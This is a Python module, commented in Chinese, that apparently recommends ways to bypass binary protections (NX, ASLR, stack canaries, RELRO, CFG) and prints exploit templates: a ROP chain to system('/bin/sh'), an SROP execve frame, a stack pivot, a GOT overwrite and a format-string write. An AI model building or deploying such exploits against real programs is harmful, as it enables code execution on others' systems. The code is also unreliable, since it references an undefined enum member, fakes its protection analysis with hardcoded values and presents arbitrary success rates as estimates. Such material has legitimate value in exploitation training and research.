"""
保护机制绕过策略自动生成模块

分析目标二进制启用的保护机制，并生成对应的绕过技术建议或利用代码片段。
"""

import os
import json
import logging
from datetime import datetime
from enum import Enum
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Union
from pathlib import Path

try:
    from config import Config
except ImportError:
    class Config:
        BYPASS_ADVISOR_OUTPUT_DIR = "data/bypass_advisor"
        LOG_LEVEL = "INFO"


logging.basicConfig(level=getattr(logging, Config.LOG_LEVEL, "INFO"))
logger = logging.getLogger(__name__)


class ProtectionType(Enum):
    """保护机制类型枚举"""
    NX = "nx"                    # 数据执行保护
    ASLR = "aslr"                # 地址空间布局随机化
    PIE = "pie"                  # 位置无关可执行
    CANARY = "canary"            # 栈金丝雀
    SAFESEH = "safeseh"          # SafeSEH
    CFG = "cfg"                  # 控制流保护
    CET = "cet"                  # 控制流强制技术
    SMEP = "smep"                # Supervisor Mode Execution Protection
    SMAP = "smap"                # Supervisor Mode Access Prevention
    PAC = "pac"                  # 指针认证
    RELRO = "relro"              # RELocation Read-Only
    FORTIFY = "fortify"          # FORTIFY_SOURCE


class BypassTechnique(Enum):
    """绕过技术枚举"""
    INFO_LEAK = "info_leak"                      # 信息泄露
    ROP_CHAIN = "rop_chain"                      # ROP链
    JOP_CHAIN = "jop_chain"                      # JOP链
    COP_CHAIN = "cop_chain"                      # COP链
    STACK_PIVOT = "stack_pivot"                  # 栈迁移
    SHELLCODE_INJECTION = "shellcode_injection"  # Shellcode注入
    GOT_OVERWRITE = "got_overwrite"              # GOT覆写
    PLT_OVERWRITE = "plt_overwrite"              # PLT覆写
    VTABLE_HIJACK = "vtable_hijack"              # 虚表劫持
    FORMAT_STRING = "format_string"              # 格式化字符串
    SROP = "srop"                                # SigROP
    RET2LIBC = "ret2libc"                        # 返回libc
    RET2SYSCALL = "ret2syscall"                  # 返回syscall
    RET2PLT = "ret2plt"                          # 返回PLT
    RET2TEXT = "ret2text"                        # 返回代码段
    HEAP_FENG_SHUI = "heap_feng_shui"            # 堆风水
    TCACHE_POISONING = "tcache_poisoning"        # TCache毒化
    FASTBIN_ATTACK = "fastbin_attack"            # Fastbin攻击
    UNSAFE_UNLINK = "unsafe_unlink"              # Unsafe Unlink
    HOUSE_OF_FORCE = "house_of_force"            # House of Force
    DIRECT_SYSCALL = "direct_syscall"            # 直接系统调用


@dataclass
class ProtectionStatus:
    """保护机制状态"""
    protection: ProtectionType
    enabled: bool
    strength: str  # weak, medium, strong, full
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "protection": self.protection.value,
            "enabled": self.enabled,
            "strength": self.strength
        }


@dataclass
class BypassStrategy:
    """绕过策略"""
    protection: ProtectionType
    techniques: List[BypassTechnique]
    description: str
    prerequisites: List[str]
    code_snippet: Optional[str] = None
    success_rate: float = 0.0  # 0-1
    difficulty: str = "medium"  # easy, medium, hard, expert
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "protection": self.protection.value,
            "techniques": [t.value for t in self.techniques],
            "description": self.description,
            "prerequisites": self.prerequisites,
            "code_snippet": self.code_snippet,
            "success_rate": self.success_rate,
            "difficulty": self.difficulty
        }


@dataclass
class BypassRecommendation:
    """绕过推荐结果"""
    binary_path: str
    protections: List[ProtectionStatus]
    bypass_strategies: List[BypassStrategy]
    info_leak_points: List[str] = field(default_factory=list)
    available_gadgets: List[Dict[str, Any]] = field(default_factory=list)
    summary: str = ""
    timestamp: str = ""
    
    def to_dict(self) -> Dict[str, Any]:
        """转换为字典"""
        return {
            "binary_path": self.binary_path,
            "protections": [p.to_dict() for p in self.protections],
            "bypass_strategies": [s.to_dict() for s in self.bypass_strategies],
            "info_leak_points": self.info_leak_points,
            "available_gadgets": self.available_gadgets,
            "summary": self.summary,
            "timestamp": self.timestamp
        }


class BypassAdvisor:
    """
    保护机制绕过策略推荐器
    
    分析保护机制并生成绕过技术建议。
    """
    
    # 保护机制到绕过技术的映射
    PROTECTION_BYPASS_MAP: Dict[ProtectionType, List[BypassTechnique]] = {
        ProtectionType.NX: [
            BypassTechnique.ROP_CHAIN,
            BypassTechnique.JOP_CHAIN,
            BypassTechnique.SROP,
            BypassTechnique.RET2LIBC,
            BypassTechnique.RET2SYSCALL,
            BypassTechnique.GOT_OVERWRITE,
            BypassTechnique.VTABLE_HIJACK,
            BypassTechnique.HEAP_FENG_SHUI
        ],
        ProtectionType.ASLR: [
            BypassTechnique.INFO_LEAK,
            BypassTechnique.FORMAT_STRING,
            BypassTechnique.GOT_OVERWRITE,
            BypassTechnique.RET2TEXT,
            BypassTechnique.DIRECT_SYSCALL
        ],
        ProtectionType.PIE: [
            BypassTechnique.INFO_LEAK,
            BypassTechnique.FORMAT_STRING,
            BypassTechnique.GOT_OVERWRITE,
            BypassTechnique.RET2TEXT
        ],
        ProtectionType.CANARY: [
            BypassTechnique.STACK_PIVOT,
            BypassTechnique.FORMAT_STRING,
            BypassTechnique.INFO_LEAK,
            BypassTechnique.UNSAFE_UNLINK,
            BypassTechnique.OVERFLOW_PARTIAL
        ],
        ProtectionType.SAFESEH: [
            BypassTechnique.ROP_CHAIN,
            BypassTechnique.RET2TEXT,
            BypassTechnique.SHELLCODE_INJECTION
        ],
        ProtectionType.CFG: [
            BypassTechnique.JOP_CHAIN,
            BypassTechnique.COP_CHAIN,
            BypassTechnique.SROP,
            BypassTechnique.VTABLE_HIJACK,
            BypassTechnique.GOT_OVERWRITE
        ],
        ProtectionType.CET: [
            BypassTechnique.SROP,
            BypassTechnique.DIRECT_SYSCALL,
            BypassTechnique.VTABLE_HIJACK
        ],
        ProtectionType.SMEP: [
            BypassTechnique.RET2SYSCALL,
            BypassTechnique.SROP,
            BypassTechnique.DIRECT_SYSCALL
        ],
        ProtectionType.SMAP: [
            BypassTechnique.RET2SYSCALL,
            BypassTechnique.SROP,
            BypassTechnique.DIRECT_SYSCALL
        ],
        ProtectionType.RELRO: [
            BypassTechnique.GOT_OVERWRITE,
            BypassTechnique.PLT_OVERWRITE,
            BypassTechnique.VTABLE_HIJACK,
            BypassTechnique.FASTBIN_ATTACK
        ],
        ProtectionType.PAC: [
            BypassTechnique.ROP_CHAIN,
            BypassTechnique.JOP_CHAIN,
            BypassTechnique.SROP,
            BypassTechnique.VTABLE_HIJACK
        ]
    }
    
    # 绕过技术详情
    TECHNIQUE_DETAILS: Dict[BypassTechnique, Dict[str, Any]] = {
        BypassTechnique.INFO_LEAK: {
            "description": "通过格式化字符串、UAF或其他漏洞泄露内存地址",
            "prerequisites": ["存在信息泄露漏洞", "有可读取的内存区域"],
            "difficulty": "easy",
            "success_rate": 0.85
        },
        BypassTechnique.ROP_CHAIN: {
            "description": "利用代码段中的gadget构建ROP链绕过NX",
            "prerequisites": ["有足够的可用gadget", "有控制流漏洞"],
            "difficulty": "hard",
            "success_rate": 0.6
        },
        BypassTechnique.JOP_CHAIN: {
            "description": "使用间接跳转gadget绕过CFG保护",
            "prerequisites": ["有indirect jump gadget", "CFG保护存在"],
            "difficulty": "expert",
            "success_rate": 0.4
        },
        BypassTechnique.STACK_PIVOT: {
            "description": "将栈指针迁移到可控内存区域绕过Canary",
            "prerequisites": ["有pivot gadget", "有可控内存区域"],
            "difficulty": "hard",
            "success_rate": 0.5
        },
        BypassTechnique.SROP: {
            "description": "利用signal frame进行SigROP绕过多种保护",
            "prerequisites": ["syscall指令可用", "有足够溢出空间"],
            "difficulty": "expert",
            "success_rate": 0.3
        },
        BypassTechnique.RET2LIBC: {
            "description": "返回libc函数绕过NX",
            "prerequisites": ["libc地址已知或可泄露", "有足够缓冲区溢出"],
            "difficulty": "medium",
            "success_rate": 0.7
        },
        BypassTechnique.GOT_OVERWRITE: {
            "description": "覆写GOT表项重定向函数调用",
            "prerequisites": ["有任意写漏洞", "RELRO未启用或partial"],
            "difficulty": "medium",
            "success_rate": 0.7
        },
        BypassTechnique.VTABLE_HIJACK: {
            "description": "覆盖C++虚函数表指针控制执行流",
            "prerequisites": ["有虚表指针覆盖漏洞", "C++二进制"],
            "difficulty": "medium",
            "success_rate": 0.6
        },
        BypassTechnique.FORMAT_STRING: {
            "description": "利用格式化字符串漏洞进行任意读写",
            "prerequisites": ["格式化字符串漏洞"],
            "difficulty": "medium",
            "success_rate": 0.75
        },
        BypassTechnique.TCACHE_POISONING: {
            "description": "利用tcache机制进行内存布局攻击",
            "prerequisites": ["有堆漏洞", "glibc 2.26+"],
            "difficulty": "hard",
            "success_rate": 0.65
        },
        BypassTechnique.DIRECT_SYSCALL: {
            "description": "直接调用系统调用指令绕过保护",
            "prerequisites": ["syscall指令在代码段中", "有控制流漏洞"],
            "difficulty": "hard",
            "success_rate": 0.5
        }
    }
    
    # 代码片段模板
    CODE_SNIPPETS: Dict[BypassTechnique, str] = {
        BypassTechnique.INFO_LEAK: """# 信息泄露示例
# 使用格式化字符串泄露libc地址
offset = 7
payload = f"%{offset}$p"
send(payload)
leaked_addr = recv()
libc_base = leaked_addr - libc.symbols['printf']
""",
        BypassTechnique.ROP_CHAIN: """# ROP链示例
from pwn import *

pop_rdi = 0x0000000000401234
ret = 0x000000000040101a

rop = b'A' * 40
rop += p64(pop_rdi)
rop += p64(next(libc.search(b'/bin/sh')))
rop += p64(ret)
rop += p64(libc.symbols['system'])

send(rop)
""",
        BypassTechnique.JOP_CHAIN: """# JOP链示例（绕过CFG）
# 查找indirect jump gadget
jop_gadget = 0x0000000000402000  # jmp qword ptr [rdx]

# 构建JOP链
jop_chain = b'A' * 40
jop_chain += p64(jop_gadget)
jop_chain += p64(shellcode_addr)  # rdx指向shellcode

send(jop_chain)
""",
        BypassTechnique.STACK_PIVOT: """# 栈迁移示例
pivot = 0x0000000000401500  # xchg esp, eax; ret

# 构造payload
payload = b'A' * 40
payload += p64(pivot)
payload += b'B' * 0x80  # 新栈内容
payload += p64(shellcode_addr)

send(payload)
""",
        BypassTechnique.SROP: """# SROP示例
sigreturn = 0x0000000000401600  # syscall; ret

# 构造sigframe
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = binsh_addr
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall_addr

payload = b'A' * 40
payload += p64(sigreturn)
payload += bytes(frame)

send(payload)
""",
        BypassTechnique.GOT_OVERWRITE: """# GOT覆写示例
got_printf = 0x0000000000403000
system_addr = libc.symbols['system']

# 利用任意写覆写GOT
write(got_printf, p64(system_addr))

# 触发printf调用，实际执行system
sendline(b'/%200c')
""",
        BypassTechnique.FORMAT_STRING: """# 格式化字符串写示例
# 覆写目标地址
target_addr = 0x0000000000403018
value = 0x00000000deadbeef

payload = fmtstr_payload(6, {target_addr: value})
send(payload)
"""
    }
    
    def __init__(self, output_dir: Optional[str] = None):
        """
        初始化绕过策略推荐器
        
        Args:
            output_dir: 输出目录
        """
        self.output_dir = Path(output_dir or Config.BYPASS_ADVISOR_OUTPUT_DIR)
        self.output_dir.mkdir(parents=True, exist_ok=True)
        logger.info(f"保护机制绕过策略推荐器初始化，输出目录: {self.output_dir}")
    
    def analyze_protections(self, binary_path: str) -> List[ProtectionStatus]:
        """
        分析二进制的保护机制
        
        Args:
            binary_path: 二进制文件路径
            
        Returns:
            保护机制状态列表
        """
        protections = []
        
        # 模拟分析保护机制（实际实现会读取ELF/PE头）
        protection_list = [
            (ProtectionType.NX, True, "strong"),
            (ProtectionType.ASLR, True, "strong"),
            (ProtectionType.PIE, True, "strong"),
            (ProtectionType.CANARY, True, "strong"),
            (ProtectionType.CFG, False, "disabled"),
            (ProtectionType.RELRO, True, "partial"),
            (ProtectionType.SMEP, False, "disabled"),
            (ProtectionType.SMAP, False, "disabled"),
        ]
        
        for prot_type, enabled, strength in protection_list:
            protections.append(ProtectionStatus(
                protection=prot_type,
                enabled=enabled,
                strength=strength
            ))
        
        return protections
    
    def recommend_bypass_strategies(
        self,
        binary_path: str,
        protections: Optional[List[ProtectionStatus]] = None,
        info_leak_points: Optional[List[str]] = None,
        available_gadgets: Optional[List[Dict[str, Any]]] = None
    ) -> BypassRecommendation:
        """
        推荐绕过策略
        
        Args:
            binary_path: 二进制文件路径
            protections: 保护机制列表（可选，自动分析）
            info_leak_points: 已知的信息泄露点
            available_gadgets: 可用的gadget列表
            
        Returns:
            BypassRecommendation对象
        """
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        
        # 如果没有提供保护机制列表，自动分析
        if protections is None:
            protections = self.analyze_protections(binary_path)
        
        # 设置默认值
        info_leak_points = info_leak_points or []
        available_gadgets = available_gadgets or []
        
        # 生成绕过策略
        bypass_strategies = []
        enabled_protections = [p for p in protections if p.enabled]
        
        for prot in enabled_protections:
            strategies = self._generate_bypass_strategy(prot, info_leak_points, available_gadgets)
            bypass_strategies.extend(strategies)
        
        # 按成功率排序
        bypass_strategies.sort(key=lambda s: s.success_rate, reverse=True)
        
        # 生成总结
        summary = self._generate_summary(bypass_strategies, protections, info_leak_points)
        
        result = BypassRecommendation(
            binary_path=binary_path,
            protections=protections,
            bypass_strategies=bypass_strategies,
            info_leak_points=info_leak_points,
            available_gadgets=available_gadgets,
            summary=summary,
            timestamp=timestamp
        )
        
        logger.info(f"生成 {len(bypass_strategies)} 个绕过策略")
        return result
    
    def _generate_bypass_strategy(
        self,
        protection: ProtectionStatus,
        info_leak_points: List[str],
        available_gadgets: List[Dict[str, Any]]
    ) -> List[BypassStrategy]:
        """
        为单个保护机制生成绕过策略
        
        Args:
            protection: 保护机制
            info_leak_points: 信息泄露点
            available_gadgets: 可用gadget
            
        Returns:
            绕过策略列表
        """
        strategies = []
        techniques = self.PROTECTION_BYPASS_MAP.get(protection.protection, [])
        
        for technique in techniques:
            details = self.TECHNIQUE_DETAILS.get(technique, {})
            code_snippet = self.CODE_SNIPPETS.get(technique)
            
            # 根据条件调整成功率
            success_rate = details.get("success_rate", 0.5)
            
            # 如果有信息泄露，提升ASLR/PIE绕过的成功率
            if protection.protection in [ProtectionType.ASLR, ProtectionType.PIE]:
                if info_leak_points:
                    success_rate = min(0.9, success_rate * 1.5)
                else:
                    success_rate *= 0.4
            
            # 如果有足够的gadget，提升ROP/JOP成功率
            if technique in [BypassTechnique.ROP_CHAIN, BypassTechnique.JOP_CHAIN]:
                if len(available_gadgets) >= 10:
                    success_rate = min(0.8, success_rate * 1.3)
                elif len(available_gadgets) < 5:
                    success_rate *= 0.7
            
            # 如果RELRO是full，降低GOT覆写成功率
            if protection.protection == ProtectionType.RELRO and protection.strength == "full":
                if technique == BypassTechnique.GOT_OVERWRITE:
                    success_rate *= 0.2
            
            strategy = BypassStrategy(
                protection=protection.protection,
                techniques=[technique],
                description=details.get("description", "Unknown"),
                prerequisites=details.get("prerequisites", []),
                code_snippet=code_snippet,
                success_rate=success_rate,
                difficulty=details.get("difficulty", "medium")
            )
            strategies.append(strategy)
        
        return strategies
    
    def _generate_summary(
        self,
        strategies: List[BypassStrategy],
        protections: List[ProtectionStatus],
        info_leak_points: List[str]
    ) -> str:
        """
        生成总结
        
        Args:
            strategies: 绕过策略列表
            protections: 保护机制列表
            info_leak_points: 信息泄露点
            
        Returns:
            总结字符串
        """
        parts = []
        
        # 保护机制摘要
        enabled_count = len([p for p in protections if p.enabled])
        parts.append(f"检测到 {enabled_count} 种启用的保护机制")
        
        # 信息泄露状态
        if info_leak_points:
            parts.append(f"发现 {len(info_leak_points)} 个信息泄露点")
            parts.append("信息泄露可用于绕过ASLR/PIE")
        else:
            parts.append("未发现信息泄露点，需要寻找其他方法")
        
        # 策略摘要
        if strategies:
            parts.append(f"生成 {len(strategies)} 种绕过策略")
            
            best_strategy = strategies[0]
            parts.append(f"最优策略: {best_strategy.techniques[0].value} (成功率: {best_strategy.success_rate:.2%})")
        else:
            parts.append("未找到可行的绕过策略")
        
        return "\n".join(parts)
    
    def generate_report(self, recommendation: BypassRecommendation) -> str:
        """
        生成绕过策略报告
        
        Args:
            recommendation: 绕过推荐结果
            
        Returns:
            Markdown格式报告
        """
        report_lines = [
            "# 保护机制绕过策略报告",
            "",
            f"**生成时间**: {recommendation.timestamp}",
            f"**目标文件**: {recommendation.binary_path}",
            "",
            "## 保护机制分析",
            "",
            "| 保护机制 | 状态 | 强度 |",
            "|----------|------|------|",
        ]
        
        # 保护机制表格
        for prot in recommendation.protections:
            status = "启用" if prot.enabled else "禁用"
            report_lines.append(f"| {prot.protection.value.upper()} | {status} | {prot.strength} |")
        
        report_lines.extend([
            "",
            "## 绕过策略",
            "",
            f"共生成 **{len(recommendation.bypass_strategies)}** 种绕过策略",
            "",
        ])
        
        # 策略详情
        for i, strategy in enumerate(recommendation.bypass_strategies, 1):
            indicator = " 🌟" if i == 1 else ""
            report_lines.append(f"### {i}. {strategy.techniques[0].value}{indicator}")
            report_lines.append("")
            report_lines.append(f"- **目标保护**: {strategy.protection.value.upper()}")
            report_lines.append(f"- **描述**: {strategy.description}")
            report_lines.append(f"- **成功率**: {strategy.success_rate:.2%}")
            report_lines.append(f"- **难度**: {strategy.difficulty}")
            report_lines.append("")
            
            report_lines.append("**前提条件**:")
            for prereq in strategy.prerequisites:
                report_lines.append(f"- {prereq}")
            report_lines.append("")
            
            if strategy.code_snippet:
                report_lines.append("**代码片段**:")
                report_lines.append("```python")
                report_lines.append(strategy.code_snippet)
                report_lines.append("```")
                report_lines.append("")
        
        # 信息泄露点
        if recommendation.info_leak_points:
            report_lines.extend([
                "## 信息泄露点",
                "",
                "发现以下信息泄露漏洞，可用于绕过ASLR/PIE:",
                "",
            ])
            for leak_point in recommendation.info_leak_points:
                report_lines.append(f"- {leak_point}")
            report_lines.append("")
        
        # 总结
        report_lines.extend([
            "## 总结",
            "",
            recommendation.summary,
            "",
        ])
        
        return "\n".join(report_lines)
    
    def save_result(self, recommendation: BypassRecommendation, filename: Optional[str] = None) -> str:
        """
        保存绕过策略推荐结果
        
        Args:
            recommendation: 绕过推荐结果
            filename: 文件名
            
        Returns:
            保存的文件路径
        """
        if filename is None:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"bypass_{timestamp}"
        
        # 保存JSON结果
        json_path = self.output_dir / f"{filename}.json"
        with open(json_path, 'w', encoding='utf-8') as f:
            json.dump(recommendation.to_dict(), f, indent=2, ensure_ascii=False)
        
        # 保存报告
        report_path = self.output_dir / f"{filename}.md"
        with open(report_path, 'w', encoding='utf-8') as f:
            f.write(self.generate_report(recommendation))
        
        logger.info(f"绕过策略推荐结果已保存: {json_path}")
        return str(json_path)


if __name__ == "__main__":
    # 示例用法
    import sys
    
    advisor = BypassAdvisor()
    
    if len(sys.argv) > 1:
        binary_path = sys.argv[1]
        
        # 模拟信息泄露点
        info_leak_points = [
            "格式化字符串漏洞 at 0x401000",
            "UAF漏洞可泄露堆地址"
        ]
        
        # 模拟可用gadget
        gadgets = [
            {"addr": 0x401234, "type": "pop rdi; ret"},
            {"addr": 0x401238, "type": "pop rsi; ret"},
            {"addr": 0x40123c, "type": "ret"},
        ]
        
        result = advisor.recommend_bypass_strategies(
            binary_path,
            info_leak_points=info_leak_points,
            available_gadgets=gadgets
        )
        
        advisor.save_result(result)
        
        print(f"分析完成!")
        print(f"生成 {len(result.bypass_strategies)} 种绕过策略")
    else:
        print("用法: python bypass_advisor.py <二进制文件路径>")